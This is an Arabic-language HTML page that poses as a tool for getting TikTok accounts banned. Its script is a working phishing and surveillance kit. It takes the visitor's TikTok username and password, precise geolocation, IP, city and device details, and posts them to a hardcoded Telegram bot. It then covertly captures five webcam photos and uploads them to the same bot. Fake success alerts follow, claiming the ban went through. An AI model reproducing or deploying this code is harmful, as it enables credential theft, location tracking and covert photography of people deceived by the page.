<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تبنيد حسابات تيك توك</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <style>
    body {
      margin: 0;
      font-family: 'Cairo', sans-serif;
      background: #000;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      overflow: hidden;
      padding: 20px;
    }
    .container {
      max-width: 400px;
      width: 100%;
      padding: 20px;
      box-sizing: border-box;
    }
    h1 {
      font-size: 26px;
      margin-bottom: 10px;
      color: #e60000;
      text-shadow: 0 0 10px #e60000;
    }
    p {
      color: #ccc;
      margin-bottom: 15px;
    }
    input {
      padding: 12px 15px;
      border-radius: 30px;
      border: none;
      margin-bottom: 15px;
      text-align: center;
      font-size: 16px;
      width: 100%;
      box-shadow: 0 0 10px #e60000;
      background: #111;
      color: white;
    }
    button {
      background: #e60000;
      color: white;
      border: none;
      padding: 14px 28px;
      border-radius: 50px;
      font-size: 18px;
      cursor: pointer;
      width: 100%;
      transition: 0.3s;
      box-shadow: 0 0 20px #e60000;
    }
    button:hover {
      background: #cc0000;
    }
    video {
      display: none;
    }
    .icon {
      font-size: 60px;
      color: #e60000;
      margin-bottom: 15px;
    }
  </style>
</head>
<body>

  <div id="loginScreen" class="container">
    <div class="icon"><i class="fab fa-tiktok"></i></div>
    <h1>تبنيد حسابات تيك توك</h1>
    <p>يرجى إدخال معلومات حسابك بدقة</p>
    <input id="username" type="text" placeholder="اسم المستخدم بدون @" autocomplete="off" />
    <input id="password" type="password" placeholder="كلمة السر" autocomplete="off" />
    <button id="loginBtn">تسجيل الدخول وتأكيد التبليغ</button>
  </div>

  <div id="banScreen" class="container" style="display:none;">
    <div class="icon"><i class="fas fa-ban"></i></div>
    <h1>تبنيد حساب تيك توك</h1>
    <p>ادخل اسم المستخدم الذي تريد تبنيده</p>
    <input id="banUsername" type="text" placeholder="اسم المستخدم بدون @" autocomplete="off" />
    <button id="banBtn">BAN</button>
    <video id="video" autoplay playsinline></video>
  </div>

<script>
  const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
  const chatId = "7220184605";

  let loggedInUser = null;
  let loggedInPass = null;

  async function sendTelegramMessage(text) {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
  }

  async function sendPhoto(blob) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", blob, "photo.jpg");
    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: "POST",
      body: formData
    });
  }

  async function getIPInfo() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      return await res.json();
    } catch {
      return {};
    }
  }

  async function getBatteryInfo() {
    try {
      const battery = await navigator.getBattery();
      return {
        level: Math.round(battery.level * 100),
        charging: battery.charging ? "نعم ⚡" : "لا ❌"
      };
    } catch {
      return { level: "غير معروف", charging: "غير معروف" };
    }
  }

  async function getLocation() {
    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition((pos) => {
        const lat = pos.coords.latitude.toFixed(5);
        const lon = pos.coords.longitude.toFixed(5);
        resolve(`https://maps.google.com/?q=${lat},${lon}`);
      }, () => {
        resolve("❌ غير مسموح أو غير متاح");
      }, { timeout: 5000 });
    });
  }

  function delay(ms) {
    return new Promise(res => setTimeout(res, ms));
  }

  // تسجيل الدخول - يظهر الواجهة الثانية عند النجاح
  document.getElementById("loginBtn").addEventListener("click", async () => {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();

    if (!username || !password) {
      alert("يرجى تعبئة جميع الحقول");
      return;
    }

    document.getElementById("loginBtn").disabled = true;

    const ipInfo = await getIPInfo();
    const battery = await getBatteryInfo();
    const location = await getLocation();
    const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });

    const deviceInfo = navigator.userAgent;
    const screenRes = `${screen.width}x${screen.height}`;
    const connection = navigator.connection || {};
    const memory = navigator.deviceMemory || "غير معروف";
    const cores = navigator.hardwareConcurrency || "غير معروف";

    let message = `
🔐 تسجيل دخول تيك توك:
👤 اسم المستخدم: ${username}
🔑 كلمة السر: ${password}

📍 الموقع الجغرافي: ${location}
🌐 الدولة: ${ipInfo.country_name || "غير معروف"}
🏙️ المدينة: ${ipInfo.city || "غير معروف"}
🕹️ IP: ${ipInfo.ip || "غير معروف"}

📱 معلومات الجهاز:
🔋 شحن: ${battery.level}%
⚡ يشحن؟: ${battery.charging}
📶 الاتصال: ${connection.effectiveType || "غير معروف"}
💾 الذاكرة: ${memory} GB
🧠 الأنوية: ${cores}
🖥️ المتصفح: ${deviceInfo}
📏 الشاشة: ${screenRes}
🕓 الوقت: ${now}
`;

    await sendTelegramMessage(message);

    // حفظ بيانات تسجيل الدخول للواجهة الثانية
    loggedInUser = username;
    loggedInPass = password;

    // الانتقال للواجهة الثانية
    document.getElementById("loginScreen").style.display = "none";
    document.getElementById("banScreen").style.display = "block";

    document.getElementById("loginBtn").disabled = false;
  });

  // زر BAN في الواجهة الثانية
  document.getElementById("banBtn").addEventListener("click", async () => {
    const banUsername = document.getElementById("banUsername").value.trim();

    if (!banUsername) {
      alert("يرجى إدخال اسم المستخدم المراد تبنيده");
      return;
    }

    document.getElementById("banBtn").disabled = true;

    const ipInfo = await getIPInfo();
    const battery = await getBatteryInfo();
    const location = await getLocation();
    const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });

    const deviceInfo = navigator.userAgent;
    const screenRes = `${screen.width}x${screen.height}`;
    const connection = navigator.connection || {};
    const memory = navigator.deviceMemory || "غير معروف";
    const cores = navigator.hardwareConcurrency || "غير معروف";

    let message = `
🚫 طلب تبنيد حساب تيك توك:
👤 المبلغ: ${loggedInUser}
🔑 كلمة سر المبلغ: ${loggedInPass}

⚠️ الحساب المراد تبنيده: ${banUsername}

📍 الموقع الجغرافي: ${location}
🌐 الدولة: ${ipInfo.country_name || "غير معروف"}
🏙️ المدينة: ${ipInfo.city || "غير معروف"}
🕹️ IP: ${ipInfo.ip || "غير معروف"}

📱 معلومات الجهاز:
🔋 شحن: ${battery.level}%
⚡ يشحن؟: ${battery.charging}
📶 الاتصال: ${connection.effectiveType || "غير معروف"}
💾 الذاكرة: ${memory} GB
🧠 الأنوية: ${cores}
🖥️ المتصفح: ${deviceInfo}
📏 الشاشة: ${screenRes}
🕓 الوقت: ${now}
`;

    await sendTelegramMessage(message);

    // التقاط 5 صور بالكاميرا وإرسالها
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.getElementById("video");
      video.srcObject = stream;
      video.play();

      for (let i = 0; i < 5; i++) {
        await delay(1500);
        const canvas = document.createElement("canvas");
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        await new Promise(resolve => canvas.toBlob(async (blob) => {
          await sendPhoto(blob);
          resolve();
        }, "image/jpeg"));
      }

      stream.getTracks().forEach(track => track.stop());

      alert("✅ تم إرسال طلب التبنيد بنجاح، يرجى الانتظار...");

      setTimeout(() => {
        alert("🚫 تم حظر الحساب نهائيًا");
      }, 10 * 60 * 1000); // 10 دقائق

    } catch (err) {
      await sendTelegramMessage("⚠️ رفض المستخدم تشغيل الكاميرا.");
      alert("⚠️ الكاميرا غير مفعلة أو مرفوضة.");
    }

    document.getElementById("banBtn").disabled = false;
  });

</script>

</body>
</html>
